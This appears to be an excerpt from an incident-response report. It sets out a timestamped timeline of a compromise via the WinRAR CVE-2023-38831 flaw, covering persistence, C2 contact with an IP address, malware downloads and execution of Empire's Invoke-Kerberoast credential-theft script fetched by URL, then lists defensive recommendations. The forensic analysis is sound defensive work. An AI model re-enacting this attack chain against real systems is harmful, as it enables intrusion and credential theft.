| 02/05/2024 09:49:50       | Employee Sniedzins opened a malicious WinRAR archive on computer DZIMTENE24, which exploiting **CVE-2023-38831: WinRAR – Decompression or Arbitrary Code Execution **vulnerability. This led to the execution of a malicious payload that establishing an initial foothold on the system. |
| 02/05/2024 09:50:05       | Gathering information about system and created file info.txt |
| 02/05/2024 09:50:06       | The malware added an entry to the registry, ensuring its persistence on the system. |
| 02/05/2024 09:50:06       | Gathering information about system. |
| 02/05/2024 09:50:08       | Uploading with curl.exe information to Command and Control [C&C] Server. |
| 02/05/2024 09:50:08       | Downloading the malware file "**eparaksts.exe**" to the employee's computer and executing it. |
| 02/05/2024 09:52:56       | Downloaded PowerShell script "**up.ps1**" |
| 02/05/2024 09:53:12       | PowerShell script `up.ps1` executed, but was blocked. |
| 02/05/2024 10:04:39       | Connection from malware "**eparaksts.exe**" established to IP address "**159.65.203.106**" |
| 02/05/2024 10:20:49       | Replaced "**disk-space.exe**" for schedule task "**\disk space logging**" |
| 02/05/2024 10:38:18       | Downloaded malware file to "**C:\Users\ksniedzins\Documents\docupdate.exe**" |
| 02/05/2024 10:38:35       | Created files "**asd.log atskaite-ksniedzins.docx atskaite.docx Untitled 1.docx**"  |
| 02/05/2024 10:38:35       | Malware `DOCUPDATE.EXE` was executed. |
| 02/05/2024 10:46:03       | Retrieves login name using `powershell -c "whoami”` |
| 02/05/2024 10:47:11       | Downloaded[https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1) |
| 02/05/2024 10:47:13       | Executed PowerShell script "**Invoke-Kerberoast.ps1**" |
| 02/05/2024 11:16:56       | Created file "**C:\Users\AD_admin\Desktop\haxed.txt**" |
| 02/05/2024 11:43:13       | System shutdown. |


## Conclusions

**Be Careful and Check emails closely:**
- Always pay close attention to the sender's details in emails.
- Verify email addresses carefully, especially in unexpected or urgent messages.
- Avoid clicking on suspicious links or downloading attachments from unverified sources.

**Use Antivirus Protection:**
- Enable Microsoft Defender or another reputable antivirus solution.
- Regularly update antivirus software to ensure it can detect the latest threats.

**Restrict PowerShell usage:**
- Implement more restrictive PowerShell settings to limit potential abuse by malicious actors.
- Monitor and log PowerShell activity to detect anomalous behavior.
  
**Maintain Software:**
- Regularly check for software updates including operating systems and applications.
- Enable automatic updates whenever possible to reduce manual oversight.

**Educate and Train employees:**
- Regular cybersecurity awareness training for all employees.
- Provide guidelines on recognizing phishing attempts, social engineering tactics and best practices for cyber security.